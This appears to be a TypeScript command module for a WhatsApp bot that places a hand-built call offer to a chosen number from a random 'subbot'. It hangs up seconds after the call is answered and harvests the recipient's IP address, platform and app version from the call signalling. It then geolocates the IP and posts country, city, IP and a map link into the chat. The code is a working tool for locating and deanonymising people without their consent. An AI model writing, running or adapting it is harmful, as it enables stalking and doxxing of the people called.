import { randomBytes } from "node:crypto";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const SWN = "@s.whatsapp.net";
const seen = new WeakSet<object>();
const dead: Map<any, number> = ((globalThis as any).__voipDead ??= new Map());
const log = (...a: any[]) => console.log("[voip]", ...a);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const P: Map<string, any> = ((globalThis as any).__voipP ??= new Map());
const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");
const bare = (j: string) => `${digits(j)}${SWN}`;

function walk(n: any, o: any[] = []): any[] {
  if (!n) return o;
  o.push(n);
  if (Array.isArray(n.content)) for (const k of n.content) walk(k, o);
  return o;
}
function findNet(n: any): string | undefined {
  for (const x of walk(n)) {
    if (String(x?.tag || "").toLowerCase().includes("net")) {
      const a = x.attrs || {};
      const v = a.addr || a.ip || a.host;
      if (v && /\d+\.\d+\.\d+\.\d+/.test(String(v))) return String(v).split(":")[0];
    }
  }
  return undefined;
}
function attrsOf(n: any) {
  const o: Record<string, string> = {};
  for (const x of walk(n)) {
    const a = x.attrs || {};
    if (a.platform && !o.platform) o.platform = String(a.platform);
    if (a.version && !o.version) o.version = String(a.version);
  }
  return o;
}

async function geo(ip: string) {
  if (!ip) return null;
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { headers: { "User-Agent": "voip" } });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { city: j.city, region: j.region, country: j.country_name, org: j.org, lat: j.latitude, lon: j.longitude };
  } catch { return null; }
}

/* ───────────────────────── subbots ───────────────────────── */

const OPEN = 1;

const isSock = (v: any) =>
  v && typeof v.sendMessage === "function" && typeof v.sendNode === "function" && v.ws && v.authState?.creds?.me?.id;

const isLive = (s: any) => {
  if (!s?.ws) return false;
  if (typeof s.ws.readyState === "number") return s.ws.readyState === OPEN;
  if (typeof s.ws.isOpen === "boolean") return s.ws.isOpen;
  return true;
};

function fromAny(x: any): any[] {
  if (!x) return [];
  if (isSock(x)) return [x];
  let arr: any[] = [];
  if (typeof x.values === "function") { try { arr = [...x.values()]; } catch {} }
  else if (Array.isArray(x)) arr = x;
  else if (typeof x === "object") arr = Object.values(x);
  return arr.map((v: any) => v?.sock ?? v?.client ?? v?.conn ?? v).filter(isSock);
}

function pool(ctx: any): { socks: any[]; where: string } {
  const G = globalThis as any;
  const found: any[] = [];
  let where = "ninguno";
  for (const k of Object.keys(G)) {
    if (k.startsWith("__voip")) continue;
    if (!/sub|bot|conn|sock|client|instance/i.test(k)) continue;
    let v: any;
    try { v = G[k]; } catch { continue; }
    const got = fromAny(v);
    if (got.length) { found.push(...got); where = `global.${k}`; }
  }
  for (const c of [G.subbots, G.__subbots, ctx.subbots]) {
    const got = fromAny(c);
    if (got.length) { found.push(...got); where = "directo"; }
  }
  return { socks: [...new Set(found)], where };
}

function liveOnly(socks: any[]) {
  const now = Date.now();
  return socks.filter((s) => {
    if (!isLive(s)) return false;
    const d = dead.get(s);
    return !d || now - d > 60000;
  });
}

function hook(sock: any) {
  if (seen.has(sock)) return;
  seen.add(sock);
  sock.ws.on("CB:call", (node: any) => {
    try {
      const first = Array.isArray(node?.content) ? node.content[0] : null;
      const tag = String(first?.tag || "").toLowerCase();
      const who = digits(String(node?.attrs?.from || first?.attrs?.["call-creator"] || ""));
      const p = P.get(who);
      log("CB:call", tag, who);
      if (!p || p.done) return;
      if (["offer", "preaccept", "accept", "transport"].includes(tag)) {
        const a = attrsOf(first);
        if (a.platform) p.platform = a.platform;
        if (a.version) p.version = a.version;
        const ip = findNet(first) || findNet(node);
        if (ip) p.ip = ip;
      }
      if (tag === "accept" && !p.done) {
        p.callId = String(first?.attrs?.["call-id"] || "") || p.callId;
        if (p.timer) clearTimeout(p.timer);
        p.timer = setTimeout(() => finish(p).catch(() => undefined), 2000 + Math.floor(Math.random() * 1000));
      }
    } catch (e) { log("hook err", e); }
  });
}

async function hangup(sock: any, target: string, callId?: string) {
  try {
    await sock.sendNode({
      tag: "call",
      attrs: { to: bare(target), id: sock.generateMessageTag?.() || `${Date.now()}` },
      content: [{ tag: "terminate", attrs: callId ? { "call-id": callId } : {} }],
    });
  } catch {}
}

/* ───────────────────────── oferta ───────────────────────── */

const CAPS = Buffer.from([0x01, 0x04, 0x05, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x11, 0x15, 0x16, 0x1a]);

async function buildAndSend(sock: any, target: string, callId: string): Promise<string> {
  const B: any = await import("baileys");
  const { encodeWAMessage, encodeSignedDeviceIdentity, getBinaryNodeChild, jidDecode } = B;

  const pn = bare(target);
  let lid: string | undefined;
  try { lid = await sock.signalRepository?.lidMapping?.getLIDForPN?.(pn); } catch {}
  const peerLid = lid || pn;

  for (const j of [pn, peerLid]) { try { await sock.presenceSubscribe?.(j); } catch {} }
  await sleep(500);

  let devs: string[] = [];
  try {
    const list = await sock.getUSyncDevices([peerLid], true, false);
    devs = (list || []).map((d: any) => d.jid).filter(Boolean);
  } catch (e: any) { throw new Error(`getUSyncDevices: ${e?.message || e}`); }
  if (!devs.length) throw new Error("ese número no tiene dispositivos");

  const norm = (j: string) => {
    const d = jidDecode?.(j);
    if (!d?.user) return j;
    const srv = j.endsWith("@lid") ? "lid" : "s.whatsapp.net";
    return d.device != null ? `${d.user}:${d.device}@${srv}` : `${d.user}@${srv}`;
  };

  const destinations = devs.map(norm).slice(0, 5);
  const targets = [...new Set(destinations.flatMap((j) => {
    const base = `${j.split("@")[0].split(":")[0]}@${j.split("@")[1]}`;
    return [base, j];
  }))];

  try {
    const keyNode = await sock.query({
      tag: "iq",
      attrs: { xmlns: "encrypt", type: "get", to: SWN },
      content: [{ tag: "key", attrs: {}, content: targets.map((j) => ({ tag: "user", attrs: { jid: j } })) }],
    });
    await B.parseAndInjectE2ESessions(keyNode, sock.signalRepository);
  } catch (e: any) { log("sesiones:", e?.message); }

  const callKey = randomBytes(32);
  let needIdentity = false;
  const destNodes: any[] = [];

  for (const j of destinations) {
    try {
      const { type, ciphertext } = await sock.signalRepository.encryptMessage({
        jid: j,
        data: encodeWAMessage({ call: { callKey: Buffer.from(callKey) } }),
      });
      if (type === "pkmsg") needIdentity = true;
      destNodes.push({ tag: "to", attrs: { jid: j }, content: [{ tag: "enc", attrs: { v: "2", type, count: "1" }, content: Buffer.from(ciphertext) }] });
    } catch (e: any) { log("cifrado:", j, e?.message); }
  }
  if (!destNodes.length) throw new Error("no se pudo cifrar para ningún dispositivo");

  const rootEnc = getBinaryNodeChild(destNodes[0], "enc");
  const meId = sock.authState.creds.me.id;
  const dev = jidDecode?.(meId)?.device ?? 0;
  const creator = `${meId.split("@")[0].split(":")[0]}:${dev}@s.whatsapp.net`;

  const content: any[] = [
    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
    { tag: "net", attrs: { medium: "2", protocol: "0", addr: "0.0.0.0:0" } },
    { tag: "net", attrs: { medium: "3", protocol: "0", addr: "0.0.0.0:0" } },
    { tag: "capability", attrs: { ver: "1" }, content: CAPS },
    { tag: "destination", attrs: {}, content: destNodes },
  ];
  if (rootEnc) content.push({ tag: "enc", attrs: { v: "2", type: rootEnc.attrs.type, count: String(destNodes.length) }, content: rootEnc.content });
  content.push({ tag: "encopt", attrs: { keygen: "2" } });
  if (needIdentity && sock.authState.creds.account) {
    try { content.push({ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }); } catch {}
  }

  const id = sock.generateMessageTag?.() || `${Date.now()}`;
  await sock.sendNode({
    tag: "call",
    attrs: { to: destinations[0], id },
    content: [{
      tag: "offer",
      attrs: { "call-creator": creator, "call-id": callId, e: "1", t: String(Math.floor(Date.now() / 1000)), platform: "web", version: "2.3000.1037863797" },
      content,
    }],
  });

  let ackErr: string | undefined;
  try {
    const ack: any = await Promise.race([sock.waitForMessage(id, 8000), sleep(8000).then(() => null)]);
    ackErr = ack?.attrs?.error;
  } catch {}
  if (ackErr && ackErr !== "0") throw new Error(`servidor rechazó (error ${ackErr})`);
  return `${destinations.length} dispositivo(s)`;
}

/* ───────────────────────── cierre ───────────────────────── */

async function finish(p: any) {
  if (p.done) return;
  p.done = true;
  if (p.timer) clearTimeout(p.timer);
  P.delete(digits(p.target));
  await hangup(p.sock, p.target, p.callId);

  const g = await geo(p.ip || "");
  const num = digits(p.target);
  const lines = [
    `📞 *Llamada registrada*`,
    `Número: +${num}`,
    g ? `País: ${g.country || "?"}` : "",
    g ? `Ciudad: ${g.city || "?"}` : "",
    p.ip ? `IP: \`${p.ip}\`` : "IP: `relay`",
    `Plataforma: ${p.platform || "?"}`,
    p.version ? `Versión: ${p.version}` : "",
    g?.lat ? `https://maps.google.com/?q=${g.lat},${g.lon}` : "",
  ].filter(Boolean);

  await p.sock.sendMessage(p.chat, { text: lines.join("\n") }, { quoted: p.cmdMsg }).catch(() => undefined);
}

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["voip", "llamar", "call"],
  category: "system",
  description: "Llama desde un subbot vivo al azar, cuelga a los 2-3 s y devuelve IP, país, plataforma y versión.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const { socks: all, where } = pool(ctx);
    const live = liveOnly(all);

    if (/^(diag|test)$/i.test((args[0] || "").trim())) {
      const caps = ["sendNode", "query", "waitForMessage", "getUSyncDevices", "presenceSubscribe"]
        .map((f) => `${typeof sock[f] === "function" ? "✅" : "❌"} ${f}`);
      await reply(
        `Sockets: *${all.length}* (${where})\nVivos: *${live.length}*\n\n${caps.join("\n")}\n\nRuta: oferta manual`,
      ).catch(() => undefined);
      return;
    }

    const joined = args.join("").replace(/\D/g, "");
    const quoted: string | undefined = info.participant;

    let target: string;
    if (joined.length >= 8) target = bare(joined);
    else if (quoted) target = bare(quoted);
    else if (info.mentionedJid?.length) target = bare(info.mentionedJid[0]);
    else {
      await reply("Uso: `.voip +573203995335` o responde a alguien.").catch(() => undefined);
      return;
    }

    const key = digits(target);
    if (P.has(key)) {
      await reply(`Ya hay llamada en curso a +${key}.`).catch(() => undefined);
      return;
    }

    const candidates = live.length ? live : all;
    if (!candidates.length) {
      await reply("No hay ningún subbot conectado ahora.").catch(() => undefined);
      return;
    }

    const shuffled = [...candidates].sort(() => Math.random() - 0.5).slice(0, 6);
    await react("📞").catch(() => undefined);

    const callId = ("00" + randomBytes(16).toString("hex").slice(2)).toUpperCase();
    let callSock: any = null;
    let how = "";
    const fails: string[] = [];

    for (const s of shuffled) {
      hook(s);
      const me = digits(s.authState?.creds?.me?.id || "");
      try {
        how = await buildAndSend(s, target, callId);
        callSock = s;
        log("ok con", me);
        break;
      } catch (e: any) {
        dead.set(s, Date.now());
        fails.push(`${me}: ${e?.message || e}`);
        log("fallo con", me, e?.message);
        await sleep(250);
      }
    }

    if (!callSock) {
      await react("❌").catch(() => undefined);
      await reply(`❌ ${fytBold("Ningún subbot pudo marcar")}\n\n${fails.slice(0, 5).join("\n")}`).catch(() => undefined);
      return;
    }

    const me = digits(callSock.authState.creds.me.id);
    const p: any = { chat: from, sock: callSock, target, cmdMsg: msg, done: false };
    P.set(key, p);

    p.timer = setTimeout(async () => {
      if (p.done) return;
      p.done = true;
      P.delete(key);
      await hangup(callSock, target, callId);
      await reply(`⏱️ +${key} no contestó.`).catch(() => undefined);
    }, 45000);

    await reply(`📞 Marcando +${key} desde \`${me}\` (${how}). Esperando…`).catch(() => undefined);
  },
};
